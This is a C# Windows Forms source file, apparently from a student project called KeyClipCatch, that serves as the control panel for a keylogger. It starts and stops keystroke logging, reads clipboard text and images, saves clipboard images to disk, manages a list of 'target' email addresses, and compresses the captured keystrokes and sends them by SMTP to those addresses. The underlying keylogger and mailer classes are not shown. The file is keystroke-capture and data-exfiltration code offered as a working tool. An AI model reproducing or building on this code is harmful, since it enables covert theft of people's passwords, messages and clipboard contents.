using System;
using System.Windows.Forms;

namespace ProiectIP
{
    public partial class KeyClipCatch : Form
    {
        private Keylogger.Keylogger _keylogger;
        private IP_Proiect.EmailSender _emailSender;
        private Compressor.Compressor _compressor;
        private Modules.GetterModule _getterModule = null;
        private Modules.SetterModule _setterModule = null;
        private bool _isRunning;

        public KeyClipCatch()
        {
            InitializeComponent();
            _keylogger = new Keylogger.Keylogger();
            _compressor = new Compressor.Compressor();
            _emailSender = IP_Proiect.EmailSender.Instance;
            _isRunning = true;
            foreach (string email in _emailSender.EmailList)
            {
                listBoxEmails.Items.Insert(listBoxEmails.Items.Count, email);
            }
        }



        private void buttonGetClipboardImage_Click(object sender, EventArgs e)
        {

        }

        private void buttonSendToMailingList_Click(object sender, EventArgs e)
        {

        }

        private void buttonToggleKeylogging_Click(object sender, EventArgs e)
        {
            if (_isRunning)
            {
                textBoxKeylogging.Text = "";
                _keylogger.Start();
                buttonToggleKeylogging.Text = "Stop";
                _isRunning = false;
                groupBoxEmail.Enabled = false;
            }
            else
            { 
                _isRunning = true;
                buttonToggleKeylogging.Text = "Start";
                _keylogger.Stop();
                textBoxKeylogging.Text = _keylogger.GetLoggedData();
                groupBoxEmail.Enabled = true;
            }
        }

        private void buttonGetClipboardText_Click(object sender, EventArgs e)
        {
            _getterModule = new Modules.GetClipboardTextModule();
            try
            {
                _getterModule.Execute();
                textBoxKeylogging.Text = System.Text.Encoding.UTF8.GetString(_getterModule.GetData().Data);
            }
            catch (System.Exception exc)
            {
                textBoxKeylogging.Text = "";
                MessageBox.Show(exc.Message);
            }
        }

        private void buttonAddEmail_Click(object sender, EventArgs e)
        {
            _emailSender.AddEmail(textBoxInputEmail.Text);
            listBoxEmails.Items.Insert(listBoxEmails.Items.Count, textBoxInputEmail.Text);
            textBoxInputEmail.Text = "";
        }

        private void buttonSetClipboardText_Click(object sender, EventArgs e)
        {
            if(_setterModule==null) _setterModule = new Modules.SetClipboardTextModule();
            _setterModule.Execute(textBoxKeylogging.Text);
        }

        private void buttonGetClipboardImage_Click_1(object sender, EventArgs e)
        {
            _getterModule = new Modules.GetClipboardImageModule();
            try
            {
                _getterModule.Execute();
                byte[] imageData = _getterModule.GetData().Data;
                System.IO.File.WriteAllBytes($"Clipboard-{DateTime.Now.Year}-{DateTime.Now.Month}-{DateTime.Now.Day}-{DateTime.Now.Hour}-{DateTime.Now.Minute}-{DateTime.Now.Second}.png", imageData);
                MessageBox.Show("Clipboard image content dumped.");
            }
            catch (System.Exception exc)
            {
                MessageBox.Show(exc.Message);
            }
        }

        private void buttonDeleteEmail_Click(object sender, EventArgs e)
        {
            try
            {
                _emailSender.DeleteEmail(listBoxEmails.SelectedIndex);
                listBoxEmails.Items.RemoveAt(listBoxEmails.SelectedIndex);
                if (listBoxEmails.Items.Count == 0)
                {
                    buttonDeleteEmail.Enabled = false;
                    buttonSaveEmails.Enabled = false;
                }
            }
            catch (IndexOutOfRangeException indexException)
            {
                MessageBox.Show("Index incorect" + indexException.Message);
            }
        }

        private void buttonSendToMailingList_Click_1(object sender, EventArgs e)
        {
            _keylogger.Stop();
            string loggedData = _keylogger.GetLoggedData();
            if (loggedData.Length != 0)
            {
                byte[] compressed = Compressor.Compressor.Compress(System.Text.Encoding.UTF8.GetBytes(loggedData));
                _emailSender.PutArray(compressed);
                if (_emailSender.EmailList.Count == 0)
                {
                    MessageBox.Show("No targets!");
                    return;
                }
                try
                {
                    _emailSender.Send();
                    MessageBox.Show("Successfully sent keylogged contents!");
                }
                catch (System.Net.Mail.SmtpException smtpException)
                {
                    MessageBox.Show("Eroare de trimitere\n" + smtpException.Message);
                }
                catch (System.Exception exception)
                {
                    MessageBox.Show("Eroare la trimitere\n" + exception.Message);
                }
            }
            else
            {
                MessageBox.Show("No content to send!");
            }
        }

        private void listBoxEmails_SelectedIndexChanged(object sender, EventArgs e)
        {
            buttonDeleteEmail.Enabled = true;
            buttonSaveEmails.Enabled = true;
        }

        private void buttonLoadEmails_Click(object sender, EventArgs e)
        {

            try
            {
                _emailSender.LoadEmails();
            }
            catch (System.IO.FileNotFoundException)
            {
                MessageBox.Show("The default config file does not exist!");
                return;
            }
            if (_emailSender.EmailList.Count == 0)
            {
                MessageBox.Show("No emails in default file!");
                return;
            }
            listBoxEmails.Items.Clear();
            foreach (string email in _emailSender.EmailList)
            {
                listBoxEmails.Items.Add(email);
            }
        }

        private void buttonSaveEmails_Click(object sender, EventArgs e)
        {
            _emailSender.SaveEmails();
        }

        private void buttonHelp_Click(object sender, EventArgs e)
        {
            try
            {
                Help.ShowHelp(this, "KeyLoggerHelp.chm");
            }
            catch (Exception)
            {
                MessageBox.Show("KeyLoggerHelp not found");
            }
        }
    }
}
